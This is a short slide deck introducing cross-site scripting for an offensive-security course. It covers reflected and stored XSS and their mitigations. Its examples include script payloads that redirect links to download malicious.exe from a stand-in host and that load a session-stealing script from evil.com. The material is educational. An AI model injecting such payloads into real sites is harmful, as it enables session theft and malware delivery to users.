---
layout: slide
title:  "Presentation 5 | Cross-site Scripting"
transition: slide
---

<section>

<img width="300px" src="{{site.baseurl}}/assets/images/code_academy.png">

<img width="300px" src="{{site.baseurl}}/assets/images/kali.png">

<h2>Offensive Security 101</h2>

<p><i>Cross-site Scripting</i></p>

</section>

<section data-markdown>

## Cross-Site Scripting (XSS)

- This occurs when an attacker injects malicious code into a trusted website or application.
- The end user’s browser has no way to know that the script should not be trusted, and will execute the script, because it thinks the script came from a trusted source.

</section>

<section data-markdown>

- The script may be able to access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.
- There are 2 common types, Reflected and Stored.
- Most commonly abused by using JavaScript or HTML.

</section>

<section data-markdown>

## Reflected XSS

- Also known as a non-persistent attack.
- Occurs when the attack is reflected off of the web server, E.g: search results, errors
- The attack is usually in the form of a malicious URL, which the victim unknowingly opens.

</section>

<section data-markdown>

## Reflected XSS Examples

- http://example.com/index.php?user=<script>alert(123)</script>
- This will cause a popup, stating '123' to appear.
- http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
- his will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.

</section>

<section data-markdown>

## Mitigating Reflective XSS

- For the common user:
- Common sense.
- Don't click random, suspicious links in emails, social media, forums. Be vigilant.
- For the website owner:
- URL Sanitisation

</section>

<section data-markdown>

## Stored XSS

- This happens when malicious code is injected into the site/application itself.
- Whenever a victim visits the compromised site, the script is executed.

</section>

<section data-markdown>

## Stored XSS Example

- E.g: A hacker finds a website with a comment section that allows embedded html.
- They post the comment "Security sux! <script src="http://evil.com/sessionstealer.js"> </script>"
- Now, whenever the page is visited, the script (which is hosted externally) is run.
- So, unlike Reflected XSS, the victim only has to visit the page, not even actively click anything, to
  be attacked.

</section>

<section data-markdown>

## Mitigating Stored XSS

- Never insert untrusted data except in allowed locations.
- HTML escaping.
- Attribute escaping.
- JavaScript escaping.

</section>

<section data-markdown>

## Real world examples
- XSS on Twitter
- https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable

- (Sort of)
- https://www.theregister.co.uk/2018/01/27/cryptojackers_slip_coinhive_mining_code_into_doubleclick_ads/

</section>

<section data-markdown>

## Fin

</section>
